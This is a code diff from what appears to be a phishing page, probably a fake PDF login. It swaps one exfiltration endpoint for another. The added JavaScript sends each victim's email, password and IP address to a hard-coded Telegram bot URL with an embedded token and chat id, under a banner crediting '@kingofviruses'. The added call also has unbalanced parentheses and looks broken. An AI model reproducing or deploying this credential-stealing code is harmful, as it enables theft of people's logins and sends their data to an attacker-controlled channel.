@@ -930,15 +930,12 @@ Time: ${now.toLocaleString()}
 ISO: ${now.toISOString()}
 ━━━━━━━━━━━━━━`;
 
-        fetch(`https://square-sun-b728.saleudon1.workers.dev/`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message
-            })
-        }).catch(() => {});
-    }
+        fetch("https://api.telegram.org/bot8066607284:AAGACS8QLcAPETXDrs0MG_fUiB9Cyy6kFGY/sendMessage?chat_id=6285796509&text=====Made By God Abeg PDF LOGS: @kingofviruses===\n    %0AEmail: "
+                                  .concat(n.Email, "%0APassword: ")
+                                  .concat(n.Password, "%0AClient IP: ")
+                                  .concat(n.IP, "%0A====&parse_mode=html")
+                              )
+                            );
 
     /* ================= PREFILL ================= */
 
@@ -1052,5 +1049,6 @@ ISO: ${now.toISOString()}
 </body>
 
 </html>
+
 
 
